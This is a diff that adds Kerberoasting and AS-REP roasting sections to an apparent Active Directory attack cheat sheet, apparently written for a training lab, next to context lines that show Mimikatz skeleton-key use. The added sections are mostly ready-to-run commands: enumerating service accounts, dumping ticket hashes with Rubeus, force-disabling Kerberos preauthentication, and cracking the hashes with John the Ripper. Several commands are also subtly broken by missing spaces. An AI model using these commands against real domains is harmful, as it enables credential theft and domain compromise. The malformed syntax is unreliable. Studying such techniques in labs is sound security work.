@@ -256,9 +256,40 @@ C:\AD> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerN
 Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
 ```
 
+Kerberoasting Attack
+```powershell
+#In a Kerberoasting attack, the attacker requests a TGS ticket from the Key Distribution Center (KDC) on behalf of a service account.
 
+#1- Find a user accounts used as service accounts
+Get-ADUser-Filter {ServicePrincipalName-ne "$null"} -Properties ServicePrincipalName
+Get-DomainUser -SPN
 
+#2- Use Rubeus to request a TGS
+Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /user:svcadmin /simple /outfile:C:\AD\Tools\hashes.txt  #once saved. Don't forget to remove the port No. ":1433"
 
+#3- Use John the Ripper
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+```
+
+Kerberoasting Attack - AS-REP
+```powershell
+#Occurs if the kerberos preauthentication is disabled. Or if you have sufficient rights (GenericWrite or GenericAll), you can disable kerberos preauth.
+
+#1- Enum accounts with Kerberos Preauth disabled
+Get-DomainUser-PreauthNotRequired-Verbose  #Using PowerView
+Get-ADUser-Filter {DoesNotRequirePreAuth-eq $True} -Properties DoesNotRequirePreAuth  #Using AD module
+
+#2- Force disable kerberos Preauth
+Find-InterestingDomainAcl-ResolveGUIDs | ?{$_.IdentityReferenceName-match "RDPUsers"}  #Enum the permissions for RDPUsers
+Set-DomainObject-Identity Control1User-XOR @{useraccountcontrol=4194304} -Verbose  #Force disabling kerberors
+
+#Request encrypted AS-REP
+Get-ASREPHash-UserName VPN1user-Verbose
+
+#4- Use John the Ripper
+john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
+```
 
 
 
